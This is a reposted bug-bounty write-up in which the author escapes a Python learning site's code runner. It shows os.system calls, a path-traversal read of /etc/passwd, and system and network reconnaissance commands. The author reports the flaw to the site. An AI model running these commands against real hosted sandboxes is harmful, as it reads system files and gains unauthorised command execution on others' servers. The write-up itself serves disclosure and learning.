# :globe_with_meridians: HOW I GOT MY FIRST RCE WHILE LEARNING PYTHON

> **Original Source:** [HOW I GOT MY FIRST RCE WHILE LEARNING PYTHON](https://infosecwriteups.com/how-i-got-my-first-rce-while-learning-python-75f51563309c)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# **HOW I GOT MY FIRST RCE WHILE LEARNING PYTHON**


Hi,


I am just learning python in redacted.com and learning and learning…


Till I spotted a section that allows us to run python code on the web and allows us to modify the files, Then I tried to run pip and what everything is working properly, I just thought what if I try to run some commands? via OS module?


I tried following code :


import os
os.system(‘cd ~’)


a=open(“../../../../etc/passwd”,”rt”)


print(a.read())


And the output for that is just lit🔥:


And I was like what the hack it is:


And what else ? i’ve reported it in a minute and the company also implemented the fix , And fix they banned some commands 😂, But i am still able to run some commands like :


## Get Sam’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


print(os.system(‘ps’))


print(os.system(‘kill -h’))


os.system(‘cat /proc/version’)
os.system(‘cat /proc/partitions’)
os.system(‘cat /proc/scsi/scsi’)
os.system(‘cat /proc/meminfo’)


print(os.system(‘ifconfig -a’))
print(os.system(‘ip link show’))
print(os.system(‘netstat’))


I am also able to compile c and c++ file and run them too like this :


f = open(“anon.cpp”, “w”)
f.write(“#include<iostream> \n”)
f.write(“using namespace std; \n”)
f.write(“int main(){ \n”)
f.write(“ cout << \”Hello World\”; \n”)
f.write(“return 0; \n}”)
f.close()
os.system(‘g++ anon.cpp -o a’)
os.system(‘./a’)


Possibly it can lead to RCE somehow, I am not sure about it, yet reported about it and they just fixed it in just 2 days .. Damn. And last site admin said: Thank you for the report, hhahahah🥲


Stay tuned for more writeups. Will publish many soon.


Thanks for reading and please ignore any mistakes and my grammar too😅, You guyz can follow me on twitter : [@__sam0_0](https://twitter.com/__Sam0_0)

---

*Originally published on [Medium](https://infosecwriteups.com/how-i-got-my-first-rce-while-learning-python-75f51563309c). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
